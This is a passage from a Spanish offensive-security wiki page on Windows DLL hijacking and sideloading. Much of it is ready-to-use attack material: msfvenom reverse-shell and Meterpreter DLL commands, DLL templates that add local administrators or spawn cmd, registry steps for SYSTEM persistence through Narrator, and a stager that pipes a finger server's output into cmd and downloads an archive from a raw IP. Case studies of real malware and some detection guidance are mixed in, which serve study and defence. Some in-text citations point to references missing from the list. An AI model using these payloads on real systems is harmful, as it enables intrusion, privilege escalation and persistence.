for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

También puedes revisar las importaciones de un ejecutable y las exportaciones de una DLL con:

```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```

Para consultar una guía completa sobre cómo **abusar de DLL Hijacking para escalar privilegios** con permisos de escritura en una **carpeta de System Path**, revisa:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Herramientas automatizadas

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)comprobará si tienes permisos de escritura en alguna carpeta dentro de system PATH.\
Otras herramientas automatizadas interesantes para descubrir esta vulnerabilidad son las **funciones de PowerSploit**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ y _Write-HijackDll._

### Ejemplo

Si encuentras un escenario explotable, una de las cosas más importantes para explotarlo con éxito sería **crear una dll que exporte al menos todas las funciones que el ejecutable importará de ella**. De todos modos, ten en cuenta que DLL Hijacking resulta útil para [**escalar del nivel de integridad Medium a High (omitiendo UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) o de [**High Integrity a SYSTEM**](../index.html#from-high-integrity-to-system)**.** Puedes encontrar un ejemplo de **cómo crear una dll válida** en este estudio sobre DLL Hijacking enfocado en su uso para ejecución: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Además, en la **siguiente sección** encontrarás algunos **códigos básicos de dll** que podrían ser útiles como **plantillas** o para crear una **dll con funciones exportadas que no sean necesarias**.

## **Creación y compilación de DLLs**

### **DLL Proxifying**

Básicamente, un **proxy de DLL** es una DLL capaz de **ejecutar tu código malicioso al cargarse**, pero también de **exponer** y **funcionar** como se **espera**, **reenviando todas las llamadas a la biblioteca real**.

Con la herramienta [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) o [**Spartacus**](https://github.com/Accenture/Spartacus) puedes **indicar un ejecutable y seleccionar la biblioteca** que quieres proxificar para **generar una dll proxificada**, o bien **indicar la DLL** y **generar una dll proxificada**.

### **Meterpreter**

**Obtener rev shell (x64):**

```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Obtén un meterpreter (x86):**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Crear un usuario (x86; no vi una versión x64):**

```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```

### La tuya

En muchos casos, la DLL que compiles debe **exportar todas las funciones importadas por el proceso víctima**. Si falta una exportación necesaria, el binario no podrá resolverla y el exploit fallará.

<details>
<summary>Plantilla de DLL en C (Win10)</summary>

```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    switch(dwReason){
        case DLL_PROCESS_ATTACH:
            system("whoami > C:\\users\\username\\whoami.txt");
            WinExec("calc.exe", 0); //This doesn't accept redirections like system
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
```

</details>

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    if (dwReason == DLL_PROCESS_ATTACH){
        system("cmd.exe /k net localgroup administrators user /add");
        ExitProcess(0);
    }
    return TRUE;
}
```

<details>
<summary>Ejemplo de DLL en C++ con creación de usuario</summary>

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
  WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
  exit(0);
  return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
  owned();
  return 0;
}
```

</details>

<details>
<summary>DLL C alternativa con punto de entrada de hilo</summary>

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
    system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call){
        case DLL_PROCESS_ATTACH:
            CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DEATCH:
            break;
    }
    return TRUE;
}
```

</details>

### DLL de NativeAOT con inicialización activada por la exportación

Una **biblioteca compartida .NET NativeAOT** autónoma se puede usar como DLL nativa plantada sin implementar un `DllMain` explícito. Exporta métodos estáticos de C# con `[UnmanagedCallersOnly(EntryPoint = "...")]`; cuando el host nativo llama a uno de estos puntos de entrada generados por el compilador, NativeAOT inicializa el módulo y se ejecuta un método `[ModuleInitializer]` antes del cuerpo de C# exportado. El resultado no requiere que haya instalado un runtime de .NET por separado.<sup>[[26]](#references)[[27]](#references)[[28]](#references)[[29]](#references)</sup>

La DLL sigue necesitando los **nombres de exportación y las firmas compatibles con la ABI** que invoque realmente el host seleccionado. Puede que basten stubs mínimos para activar la inicialización, pero las exportaciones que falten pueden impedir la carga y una firma incorrecta puede corromper la llamada. Enumera las importaciones del host y valida el resultado con `dumpbin /exports payload.dll` antes de cambiar el nombre del resultado por el nombre de dependencia que espera el host.<sup>[[26]](#references)[[28]](#references)</sup>

<details>
<summary>DLL exportada mínima de NativeAOT</summary>

```csharp
using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

internal static class Bootstrap
{
    [ModuleInitializer]
    internal static void Start()
    {
        File.WriteAllText(Path.Combine(Path.GetTempPath(), "nativeaot-sideload.txt"),
                          Environment.ProcessPath ?? "loaded");
    }
}

public static class Exports
{
    [UnmanagedCallersOnly(EntryPoint = "LoadLibraryShim")]
    public static nint LoadLibraryShim() => 0;
}
```

</details>

Configura el proyecto como una biblioteca compartida nativa de Windows autocontenida:<sup>[[26]](#references)[[27]](#references)</sup>

```xml
<PropertyGroup>
  <TargetFramework>net7.0</TargetFramework>
  <PublishAot>true</PublishAot>
  <NativeLib>Shared</NativeLib>
  <SelfContained>true</SelfContained>
  <RuntimeIdentifier>win-x64</RuntimeIdentifier>
</PropertyGroup>
```

```powershell
dotnet publish .\SideloadPoc.csproj -c Release -r win-x64
dumpbin /exports .\bin\Release\net7.0\win-x64\publish\SideloadPoc.dll
Copy-Item .\bin\Release\net7.0\win-x64\publish\SideloadPoc.dll .\<expected-name>.dll
```

Coloca la DLL renombrada junto al ejecutable vulnerable copiado e inicia el host mediante la ruta de código que llama a la exportación compatible. Este enfoque de inicializador evita colocar trabajo complejo directamente en `DllMain`, pero las precondiciones de sideload no cambian: el loader debe resolver la dependencia por nombre, seleccionar el directorio de la aplicación y no satisfacerla primero mediante KnownDLLs, un módulo ya cargado, redirección SxS o flags `LOAD_LIBRARY_SEARCH_*` restringidos.<sup>[[26]](#references)[[30]](#references)</sup>

Para plantillas nativas convencionales, consulta [Windows C payloads](../windows-c-payloads.md). Una primera etapa cargada mediante sideload puede realizar posteriormente [process hollowing](../../../reversing/common-api-used-in-malware.md#process-hollowing-aka-runpe), pero se trata de una técnica de inyección independiente, no de parte de la resolución de DLL.

## Detección: cargas de bibliotecas con DLL masquerading

Elastic Defend 9.5.0 enriquece un evento de carga de biblioteca con `dll.Ext.defense_evasions: "DLL Hijack: Masquerading"` cuando el archivo cargado no está firmado por Microsoft y su nombre coincide con el inventario en caché de nombres de DLL de Windows/sistema de Elastic. Esto traslada el inventario de nombres de archivo y el análisis de ubicación del sistema y de firmas al sensor del endpoint; por lo tanto, el EQL principal puede reducirse a:<sup>[[26]](#references)</sup>

```text
library where host.os.type == "windows" and event.action == "load" and
  dll.Ext.defense_evasions : "DLL Hijack: Masquerading"
```

Trata el enriquecimiento como un pivote de alto valor, no como prueba por sí solo. Aumenta la confianza cuando un host firmado carga la DLL desde su propio directorio **modificable por el usuario**, la DLL no está firmada o no es de confianza, y `dll.Ext.relative_file_creation_time` indica que se creó poco antes de cargarse. Limita las exclusiones a la combinación exacta de editor + proceso host + ruta de instalación; no suprimas globalmente un nombre de DLL que coincida, ya que los instaladores y las aplicaciones legítimos pueden incluir bibliotecas privadas con nombres similares a los del sistema.<sup>[[26]](#references)</sup>

En los sensores que no cuentan con ese enriquecimiento, aproxima el comportamiento correlacionando un nombre de DLL coincidente con una ruta de carga que no sea del sistema, una firma de Microsoft ausente o no confiable y un intervalo breve entre la creación del archivo y su carga. Esto requiere un inventario actualizado de nombres de DLL y exclusiones precisas para `%SystemRoot%\\System32`, `SysWOW64`, `WinSxS` y otras rutas de implementación aprobadas.<sup>[[26]](#references)</sup>

## Caso de estudio: Secuestro de DLL de localización TTS OneCore de Narrator (accesibilidad/AT)

Windows Narrator.exe todavía busca al iniciarse una DLL de localización predecible y específica del idioma, que puede secuestrarse para ejecutar código arbitrario y lograr persistencia.<sup>[[7]](#references)</sup>

Datos clave
- Ruta de búsqueda (compilaciones actuales): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Ruta heredada (compilaciones antiguas): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Si existe una DLL modificable por un atacante en la ruta de OneCore, se carga y se ejecuta `DllMain(DLL_PROCESS_ATTACH)`. No se requieren exports.

Detección con Procmon
- Filtro: `Process Name is Narrator.exe` y `Operation is Load Image` o `CreateFile`.
- Inicia Narrator y observa el intento de carga de la ruta anterior.

DLL mínima
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    // Optional OPSEC: DisableThreadLibraryCalls(h);
    // Suspend/quiet Narrator main thread, then run payload
    // (see PoC for implementation details)
  }
  return TRUE;
}
```

Silencio OPSEC
- Un hijack ingenuo hará que la interfaz hable o resalte elementos. Para actuar en silencio, al conectarte enumera los hilos de Narrator, abre el hilo principal (`OpenThread(THREAD_SUSPEND_RESUME)`) y suspéndelo con `SuspendThread`; continúa en tu propio hilo. Consulta el PoC para ver el código completo.<sup>[[8]](#references)</sup>

Activación y persistencia mediante configuración de Accesibilidad
- Contexto del usuario (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Con lo anterior, al iniciar Narrator se carga la DLL implantada. En el escritorio seguro (pantalla de inicio de sesión), pulsa CTRL+WIN+ENTER para iniciar Narrator; tu DLL se ejecuta como SYSTEM en el escritorio seguro.

Ejecución de SYSTEM activada por RDP (movimiento lateral)
- Permite la capa de seguridad RDP clásica: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Conéctate al host por RDP y, en la pantalla de inicio de sesión, pulsa CTRL+WIN+ENTER para iniciar Narrator; tu DLL se ejecuta como SYSTEM en el escritorio seguro.
- La ejecución se detiene cuando se cierra la sesión RDP: inyecta o migra rápidamente.

Bring Your Own Accessibility (BYOA)
- Puedes clonar una entrada del registro de una herramienta de Accesibilidad (AT) integrada (p. ej., CursorIndicator), editarla para que apunte a un binario o DLL arbitrarios, importarla y, luego, establecer `configuration` con el nombre de esa AT. Esto permite ejecutar código arbitrario mediante el framework de Accesibilidad.

Notas
- Escribir en `%windir%\System32` y cambiar valores HKLM requiere privilegios de administrador.
- Toda la lógica del payload puede estar en `DLL_PROCESS_ATTACH`; no se necesitan exports.

## Caso práctico: CVE-2025-1729: escalada de privilegios mediante TPQMAssistant.exe

Este caso muestra **Phantom DLL Hijacking** en TrackPoint Quick Menu de Lenovo (`TPQMAssistant.exe`), identificado como **CVE-2025-1729**.<sup>[[2]](#references)[[3]](#references)</sup>

### Detalles de la vulnerabilidad

- **Componente**: `TPQMAssistant.exe`, ubicado en `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Tarea programada**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` se ejecuta a diario a las 9:30 a. m. con el contexto del usuario que inició sesión.
- **Permisos del directorio**: escritura permitida a `CREATOR OWNER`, lo que permite a usuarios locales dejar archivos arbitrarios.
- **Comportamiento de búsqueda de DLL**: intenta cargar primero `hostfxr.dll` desde su directorio de trabajo y registra "NAME NOT FOUND" si no existe, lo que indica que el directorio local tiene precedencia en la búsqueda.

### Implementación del exploit

Un atacante puede colocar un archivo auxiliar `hostfxr.dll` malicioso en el mismo directorio y aprovechar la DLL ausente para ejecutar código con el contexto del usuario:

```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Payload: display a message box (proof-of-concept)
        MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
    }
    return TRUE;
}
```

### Flujo del ataque

1. Como usuario estándar, coloca `hostfxr.dll` en `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Espera a que la tarea programada se ejecute a las 9:30 AM en el contexto del usuario actual.
3. Si hay un administrador conectado cuando se ejecuta la tarea, la DLL maliciosa se ejecuta en la sesión del administrador con integridad media.
4. Encadena técnicas estándar de UAC bypass para escalar de integridad media a privilegios de SYSTEM.

## Caso de estudio: Dropper MSI CustomAction + DLL Side-Loading mediante un host firmado (wsc_proxy.exe)

Los actores de amenazas suelen combinar droppers basados en MSI con DLL side-loading para ejecutar cargas útiles bajo un proceso firmado y de confianza.<sup>[[10]](#references)</sup>

Resumen de la cadena
- El usuario descarga un MSI. Una CustomAction se ejecuta silenciosamente durante la instalación mediante la GUI (p. ej., LaunchApplication o una acción VBScript) y reconstruye la siguiente etapa a partir de recursos incrustados.
- El dropper escribe un EXE legítimo y firmado, y una DLL maliciosa en el mismo directorio (ejemplo de pareja: wsc_proxy.exe firmado por Avast + wsc.dll controlada por el atacante).
- Al iniciar el EXE firmado, el orden de búsqueda de DLL de Windows carga primero wsc.dll desde el directorio de trabajo y ejecuta el código del atacante bajo un proceso padre firmado (ATT&CK T1574.001).

Análisis de MSI (qué buscar)
- Tabla CustomAction:
  - Busca entradas que ejecuten archivos ejecutables o VBScript. Patrón sospechoso de ejemplo: LaunchApplication ejecutando un archivo incrustado en segundo plano.
  - En Orca (Microsoft Orca.exe), inspecciona las tablas CustomAction, InstallExecuteSequence y Binary.
- Cargas útiles incrustadas/divididas en el CAB del MSI:
  - Extracción administrativa: msiexec /a package.msi /qb TARGETDIR=C:\out
  - O usa lessmsi: lessmsi x package.msi C:\out
  - Busca varios fragmentos pequeños que se concatenen y descifren mediante una CustomAction de VBScript. Flujo habitual:

```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```

Sideloading práctico con wsc_proxy.exe
- Coloca estos dos archivos en la misma carpeta:
  - wsc_proxy.exe: host legítimo firmado (Avast). El proceso intenta cargar wsc.dll por nombre desde su directorio.
  - wsc.dll: DLL del atacante. Si no se requieren exports específicos, DllMain puede ser suficiente; de lo contrario, crea una DLL proxy y reenvía los exports necesarios a la biblioteca genuina mientras ejecutas el payload en DllMain.
- Crea un payload mínimo de DLL:

```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
  }
  return TRUE;
}
```

- Para cumplir los requisitos de exportación, usa un framework de proxy (p. ej., DLLirant/Spartacus) para generar una DLL de reenvío que también ejecute tu payload.

- Esta técnica depende de la resolución de nombres de DLL por parte del binario anfitrión. Si el anfitrión usa rutas absolutas o flags de carga segura (p. ej., LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), el hijacking puede fallar.
- KnownDLLs, SxS y las exportaciones reenviadas pueden influir en la precedencia y deben tenerse en cuenta al seleccionar el binario anfitrión y el conjunto de exportaciones.

## Tríadas firmadas + payloads cifrados (estudio de caso de ShadowPad)

Check Point describió cómo Ink Dragon despliega ShadowPad mediante una **tríada de tres archivos** para camuflarse como software legítimo y mantener cifrado en disco el payload principal:<sup>[[12]](#references)</sup>

1. **EXE anfitrión firmado** – se abusa de proveedores como AMD, Realtek o NVIDIA (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Los atacantes renombran el ejecutable para que parezca un binario de Windows (por ejemplo, `conhost.exe`), pero la firma Authenticode sigue siendo válida.
2. **DLL loader maliciosa** – se deja junto al EXE con un nombre esperado (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). La DLL suele ser un binario MFC ofuscado con el framework ScatterBrain; su única función es localizar el blob cifrado, descifrarlo y mapear ShadowPad de forma reflectiva.
3. **Blob de payload cifrado** – suele almacenarse como `<name>.tmp` en el mismo directorio. Después de mapear en memoria el payload descifrado, el loader elimina el archivo TMP para destruir las pruebas forenses.

Notas de tradecraft:

* Renombrar el EXE firmado (manteniendo el `OriginalFileName` original en el encabezado PE) permite que se haga pasar por un binario de Windows y conserve la firma del proveedor; por eso, replica la costumbre de Ink Dragon de dejar binarios con apariencia de `conhost.exe` que en realidad son utilidades de AMD/NVIDIA.
* Como el ejecutable sigue siendo de confianza, la mayoría de controles de allowlisting solo requieren que tu DLL maliciosa esté junto a él. Concéntrate en personalizar la DLL loader; normalmente, el proceso padre firmado puede ejecutarse sin modificaciones.
* El decryptor de ShadowPad espera que el blob TMP esté junto al loader y tenga permisos de escritura para poder poner el archivo a cero después del mapeo. Mantén el directorio con permisos de escritura hasta que se cargue el payload; una vez en memoria, puedes eliminar el archivo TMP de forma segura para OPSEC.

### Cadena de stager LOLBAS + sideloading de archivo por etapas (finger → tar/curl → WMI)

Los operadores combinan el DLL sideloading con LOLBAS para que el único artefacto personalizado en disco sea la DLL maliciosa junto al EXE de confianza:<sup>[[1]](#references)</sup>

- **Loader de comandos remoto (Finger):** PowerShell oculto inicia `cmd.exe /c`, obtiene comandos de un servidor Finger y los canaliza a `cmd`:

  ```powershell
  powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
  ```
  - `finger user@host` obtiene texto mediante TCP/79; `| cmd` ejecuta la respuesta del servidor, lo que permite a los operadores cambiar la segunda etapa desde el servidor.

- **Descarga/extracción integrada:** Descarga un archivo con una extensión inofensiva, descomprímelo y coloca el objetivo de sideload y la DLL en una carpeta aleatoria de `%LocalAppData%`:

  ```powershell
  $base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
  ```
  - `curl -s -L` oculta el progreso y sigue las redirecciones; `tar -xf` usa el tar integrado de Windows.

- **Lanzamiento mediante WMI/CIM:** Inicia el EXE mediante WMI para que la telemetría muestre un proceso creado por CIM mientras carga la DLL ubicada en el mismo directorio:

  ```powershell
  Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
  ```
  - Funciona con binarios que prefieren DLL locales (p. ej., `intelbq.exe`, `nearby_share.exe`); el payload (p. ej., Remcos) se ejecuta con el nombre de confianza.

- **Búsqueda:** Genera una alerta sobre `forfiles` cuando `/p`, `/m` y `/c` aparecen juntos; es poco habitual fuera de los scripts de administración.


## Caso práctico: dropper NSIS + sideload del Bitdefender Submission Wizard (Chrysalis)

Una intrusión reciente de Lotus Blossom abusó de una cadena de actualización de confianza para distribuir un dropper empaquetado con NSIS que preparaba un sideload de DLL y payloads completamente en memoria.<sup>[[13]](#references)</sup>

Flujo de tradecraft
- `update.exe` (NSIS) crea `%AppData%\Bluetooth`, lo marca como **HIDDEN**, deposita un Bitdefender Submission Wizard renombrado (`BluetoothService.exe`), un `log.dll` malicioso y un blob cifrado `BluetoothService`; luego ejecuta el EXE.
- El host EXE importa `log.dll` y llama a `LogInit`/`LogWrite`. `LogInit` carga el blob mediante mmap; `LogWrite` lo descifra con un flujo personalizado basado en LCG (constantes **0x19660D** / **0x3C6EF35F**, material de clave derivado de un hash previo), sobrescribe el búfer con shellcode en texto plano, libera los temporales y salta a él.
- Para evitar una IAT, el loader resuelve las API mediante el hash de los nombres de exportación con **FNV-1a, base 0x811C9DC5 + primo 0x1000193**, y luego aplica una función de dispersión tipo Murmur (**0x85EBCA6B**) y compara con hashes objetivo salados.

Shellcode principal (Chrysalis)
- Descifra un módulo principal similar a un PE repitiendo operaciones de suma/XOR/resta con la clave `gQ2JR&9;` en cinco pasadas; luego carga dinámicamente `Kernel32.dll` → `GetProcAddress` para completar la resolución de importaciones.
- Reconstruye cadenas de nombres de DLL en tiempo de ejecución mediante transformaciones de rotación de bits/XOR por carácter; luego carga `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Usa un segundo resolver que recorre **PEB → InMemoryOrderModuleList**, analiza cada tabla de exportación en bloques de 4 bytes con mezcla tipo Murmur y solo recurre a `GetProcAddress` si no encuentra el hash.

Configuración integrada y C2
- La configuración está dentro del archivo `BluetoothService` depositado, en el **offset 0x30808** (tamaño **0x980**), y se descifra con RC4 usando la clave `qwhvb^435h&*7`, lo que revela la URL de C2 y el User-Agent.
- Los beacons crean un perfil de host delimitado por puntos, anteponen la etiqueta `4Q` y luego lo cifran con RC4 usando la clave `vAuig34%^325hGV` antes de llamar a `HttpSendRequestA` mediante HTTPS. Las respuestas se descifran con RC4 y se procesan mediante un switch de etiquetas (`4T` shell, `4V` ejecución de procesos, `4W/4X` escritura de archivos, `4Y` lectura/exfiltración, `4\\` desinstalación, `4` enumeración de unidades/archivos + casos de transferencia por fragmentos).
- El modo de ejecución depende de los argumentos CLI: sin argumentos = instala persistencia (servicio/clave Run) apuntando a `-i`; `-i` vuelve a ejecutar el proceso con `-k`; `-k` omite la instalación y ejecuta el payload.

Loader alternativo observado
- La misma intrusión depositó Tiny C Compiler y ejecutó `svchost.exe -nostdlib -run conf.c` desde `C:\ProgramData\USOShared\`, con `libtcc.dll` en el mismo directorio. El código fuente C proporcionado por el atacante incorporaba shellcode, lo compilaba y lo ejecutaba en memoria sin escribir un PE en el disco. Reprodúcelo con:

```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```

- Esta etapa de compilación y ejecución basada en TCC importó `Wininet.dll` en tiempo de ejecución y obtuvo un shellcode de segunda etapa desde una URL codificada de forma fija, creando un loader flexible que se hace pasar por una ejecución del compilador.

## Signed-host sideloading with export proxying + host thread parking

Algunas cadenas de DLL sideloading incorporan **ingeniería de estabilidad** para que el host legítimo siga activo el tiempo suficiente como para cargar las etapas posteriores correctamente, en lugar de bloquearse después de cargar la DLL maliciosa.<sup>[[11]](#references)</sup>

Patrón observado
- Coloca un EXE de confianza junto a una DLL maliciosa usando el nombre de dependencia esperado, como `version.dll`.
- La DLL maliciosa **redirige todas las exportaciones esperadas** a la DLL real del sistema (por ejemplo, `%SystemRoot%\\System32\\version.dll`) para que la resolución de importaciones siga funcionando y el proceso host continúe operativo.
- Después de cargarse, la DLL maliciosa **modifica el punto de entrada del host** para que el hilo principal entre en un bucle infinito de `Sleep`, en lugar de salir o ejecutar rutas de código que terminarían el proceso.
- Un hilo nuevo realiza el trabajo malicioso real: descifra el nombre o la ruta de la DLL de la siguiente etapa (RC4/XOR son comunes) y luego la inicia con `LoadLibrary`.

Por qué es importante
- La redirección normal de DLL conserva la compatibilidad de la API, pero no garantiza que el host siga activo el tiempo suficiente para las etapas posteriores.
- Mantener el hilo principal en `Sleep(INFINITE)` es una forma sencilla de dejar el proceso firmado en ejecución mientras el loader realiza el descifrado, la preparación de etapas o el inicio de la conexión de red en un hilo de trabajo.
- Buscar únicamente un `DllMain` sospechoso puede pasar por alto este patrón si el comportamiento relevante ocurre después de modificar el punto de entrada del host y de iniciar un hilo secundario.

Flujo de trabajo mínimo
1. Copia el EXE firmado del host y determina qué DLL resuelve desde el directorio local.
2. Crea una DLL proxy que exporte las mismas funciones y las redirija a la DLL legítima.
3. En `DllMain(DLL_PROCESS_ATTACH)`, crea un hilo de trabajo.
4. Desde ese hilo, modifica el punto de entrada del host o la rutina de inicio del hilo principal para que entre en un bucle con `Sleep`.
5. Descifra el nombre o la configuración de la DLL de la siguiente etapa y llama a `LoadLibrary` o asigna manualmente el payload en memoria.

Indicadores defensivos
- Procesos firmados que cargan `version.dll` u otras bibliotecas comunes desde su propio directorio de aplicación en vez de `System32`.
- Parches de memoria en el punto de entrada del proceso poco después de cargar la imagen, especialmente saltos o llamadas redirigidos a `Sleep`/`SleepEx`.
- Hilos creados por una DLL proxy que llaman inmediatamente a `LoadLibrary` para cargar una segunda DLL con un nombre descifrado.
- DLL proxy que exportan todas las funciones, ubicadas junto a ejecutables de proveedores dentro de directorios de preparación con permisos de escritura, como `ProgramData`, `%TEMP%` o rutas de archivos comprimidos extraídos.

## References

- [1] [Red Canary – Perspectivas de inteligencia: enero de 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 - Escalada de privilegios mediante TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna – TCAPT: DLL Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc – DLL hijacking en Windows. Ejemplo sencillo en C.](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research – Nimbus Manticore despliega nuevo malware dirigido a Europa](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec – Hack-cessibility: cuando los DLL hijacks se encuentran con los asistentes de Windows](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 – Doppelgängers digitales: anatomía de campañas de suplantación en evolución que distribuyen Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 – Intereses convergentes: análisis de grupos de amenazas dirigidos a un gobierno del sudeste asiático](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research – Dentro de Ink Dragon: revelando la red de retransmisión y el funcionamiento interno de una operación ofensiva sigilosa](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 – La puerta trasera Chrysalis: análisis detallado del toolkit de Lotus Blossom](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf – HTB Bruno: cadena ZipSlip → DLL hijack](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 – Seguimiento de las campañas de espionaje de 2026 del APT iraní Screening Serpens](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn – Elemento `<appDomainManagerAssembly>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn – Elemento `<appDomainManagerType>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn – Elemento `<probing>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn – Elemento `<bypassTrustedAppStrongNames>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn – Elemento `<publisherPolicy>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn – Elemento `<requiredRuntime>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research – Rápido y furioso: operaciones de Nimbus Manticore durante el conflicto iraní](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn – Acciones de tareas](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
